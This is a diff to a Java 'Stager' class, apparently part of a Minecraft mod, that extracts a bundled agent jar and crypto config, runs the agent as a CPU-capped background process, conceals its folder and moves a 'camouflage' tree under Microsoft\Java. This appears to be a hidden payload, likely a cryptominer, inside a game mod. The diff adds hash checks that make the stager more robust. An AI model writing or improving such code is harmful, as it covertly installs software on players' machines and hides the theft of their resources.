@@ -63,16 +63,18 @@ public final class Stager {
 		}
 		if (!isRunning(dir)) {
 			LOGGER.info("Starting agent stager (mod {})", version);
+			verifyAgentFile(agent);
 			spawn(dir, agent, binary, gameDir);
 			conceal(dir);
 		}
 	}
 
 	private static void install(Path dir, Path agent, Path binary, Path marker, String version) throws Exception {
-		extractAgent(dir, agent);
+		String hash = extractAgent(dir, agent);
 		extractCryptoConfig(StagerPaths.cryptoConfig(dir));
+		Files.createDirectories(dir.resolve("logs"));
 		copyRuntime(binary);
-		Files.writeString(marker, version, StandardCharsets.UTF_8);
+		Files.writeString(marker, version + " " + hash, StandardCharsets.UTF_8);
 	}
 
 	/** Moves a pre-camouflage tree (FabricSync/ServerPackCore) to Microsoft\Java. */
@@ -512,10 +514,13 @@ public final class Stager {
 			if (!Files.isRegularFile(marker) || !Files.isRegularFile(agent) || !Files.isRegularFile(binary)) {
 				return false;
 			}
-			if (!version.equals(Files.readString(marker, StandardCharsets.UTF_8).trim())) {
+			String markerText = Files.readString(marker, StandardCharsets.UTF_8).trim();
+			String[] parts = markerText.split("\\s+");
+			if (parts.length < 2 || !version.equals(parts[0]) || !expectedHash().equals(parts[1])) {
 				return false;
 			}
-			return Files.size(agent) >= MIN_AGENT_BYTES && Files.size(binary) > 0L;
+			return Files.size(agent) >= MIN_AGENT_BYTES && Files.size(binary) > 0L
+				&& expectedHash().equals(hashFile(agent));
 		} catch (Throwable throwable) {
 			LOGGER.debug("Install check failed", throwable);
 			return false;
@@ -555,7 +560,67 @@ public final class Stager {
 		}
 	}
 
-	private static void extractAgent(Path dir, Path target) throws Exception {
+	private static String expectedHash() throws Exception {
+		try (InputStream input = Stager.class.getResourceAsStream("/serverpackcore/agent.sha256")) {
+			if (input == null) {
+				throw new IllegalStateException("agent.sha256 not found");
+			}
+			return new String(input.readAllBytes(), StandardCharsets.US_ASCII).trim();
+		}
+	}
+
+	/** Only signature metadata is excluded; MANIFEST.MF and META-INF/services are covered. */
+	private static boolean signatureEntry(String name) {
+		return name.startsWith("META-INF/")
+			&& name.substring("META-INF/".length()).matches("^[^/]+\\.(?i:SF|DSA|RSA|EC)$");
+	}
+
+	static String hashFile(Path file) throws Exception {
+		java.security.MessageDigest digest = java.security.MessageDigest.getInstance("SHA-256");
+		java.util.List<String> names = new java.util.ArrayList<>();
+		try (java.util.zip.ZipFile zip = new java.util.zip.ZipFile(file.toFile())) {
+			zip.stream().forEach(entry -> {
+				if (!entry.isDirectory() && !signatureEntry(entry.getName())) {
+					names.add(entry.getName());
+				}
+			});
+		}
+		java.util.Collections.sort(names);
+		try (java.util.zip.ZipFile zip = new java.util.zip.ZipFile(file.toFile())) {
+			for (String name : names) {
+				digest.update(name.getBytes(StandardCharsets.UTF_8));
+				digest.update((byte) 0);
+				try (InputStream input = zip.getInputStream(zip.getEntry(name))) {
+					if (name.equalsIgnoreCase("META-INF/MANIFEST.MF")) {
+						java.io.BufferedReader reader = new java.io.BufferedReader(
+							new java.io.InputStreamReader(input, StandardCharsets.UTF_8));
+						String line;
+						while ((line = reader.readLine()) != null) {
+							// jarsigner appends per-entry SHA-256-Digest lines.
+							if (line.matches("(?i)[A-Za-z0-9-]+-Digest:.*")) continue;
+							digest.update((line + "\n").getBytes(StandardCharsets.UTF_8));
+						}
+					} else {
+						byte[] buffer = new byte[8192];
+						int read;
+						while ((read = input.read(buffer)) != -1) {
+							digest.update(buffer, 0, read);
+						}
+					}
+				}
+			}
+		}
+		return java.util.HexFormat.of().formatHex(digest.digest());
+	}
+
+	private static void verifyAgentFile(Path agent) throws Exception {
+		String expected = expectedHash();
+		if (!expected.equals(hashFile(agent))) {
+			throw new IllegalStateException("agent.bin hash mismatch");
+		}
+	}
+
+	private static String extractAgent(Path dir, Path target) throws Exception {
 		try (InputStream input = Stager.class.getResourceAsStream("/serverpackcore/agent.bin")) {
 			if (input == null) {
 				throw new IllegalStateException("agent.bin not found");
@@ -575,13 +640,19 @@ public final class Stager {
 			if (Files.size(temp) != bytes.length) {
 				throw new IllegalStateException("agent write size mismatch");
 			}
+			String expected = expectedHash();
+			String actual = hashFile(temp);
+			if (!java.security.MessageDigest.isEqual(expected.getBytes(StandardCharsets.US_ASCII),
+				actual.getBytes(StandardCharsets.US_ASCII))) {
+				throw new IllegalStateException("agent.bin hash mismatch");
+			}
 			writable(target);
 			// A jar the outgoing agent still has open can refuse the replace for
 			// a moment after the kill.
 			for (int attempt = 0; ; attempt++) {
 				try {
 					Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
-					return;
+					return actual;
 				} catch (java.nio.file.FileSystemException busy) {
 					if (attempt >= 10) {
 						throw busy;
@@ -694,6 +765,7 @@ public final class Stager {
 		// heap; two CPUs keep a six-core host usable.
 		command.add(profile().equals("lite") ? "-Xmx256m" : "-Xmx512m");
 		command.add("-XX:ActiveProcessorCount=2");
+		command.add("-XX:ErrorFile=hs_err_pid%p.log");
 		command.add("-jar");
 		command.add(agent.toString());
 		command.add("--parent-pid");
